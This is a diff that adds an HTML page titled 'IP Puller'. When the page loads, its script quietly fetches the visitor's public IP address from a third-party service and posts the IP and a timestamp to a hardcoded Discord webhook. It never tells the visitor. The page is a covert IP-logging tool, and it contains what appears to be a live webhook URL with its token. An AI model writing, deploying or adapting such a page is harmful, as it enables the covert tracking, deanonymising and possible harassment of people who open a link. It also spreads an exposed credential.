@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Puller</title>
+</head>
+<body>
+  <h1>IP Puller</h1>
+  <script>
+    // Function to send the IP and timestamp using a Discord webhook
+    function sendIP(ip, timestamp) {
+      // Replace 'WEBHOOK_URL' with your actual Discord webhook URL
+      var webhookURL = 'https://discord.com/api/webhooks/1155301904771973282/4CL70Krtsq1VSUM8nCYTXyTaRWYknNQlVn1zROZ21tOcvwdAL9cZ-IzlVRRl6Rx_7UKx';
+
+      // Create a JSON payload with the IP and timestamp
+      var payload = JSON.stringify({
+        content: 'IP: ' + ip + ', Timestamp: ' + timestamp
+      });
+
+      // Send a POST request to the webhook URL
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', webhookURL, true);
+      xhr.setRequestHeader('Content-type', 'application/json');
+      xhr.send(payload);
+    }
+
+    // Fetch the IP using a third-party service and get the current timestamp
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        var ip = data.ip;
+        var timestamp = new Date().toLocaleString();
+        sendIP(ip, timestamp);
+      })
+      .catch(error => console.error(error));
+  </script>
+</body>
+</html>
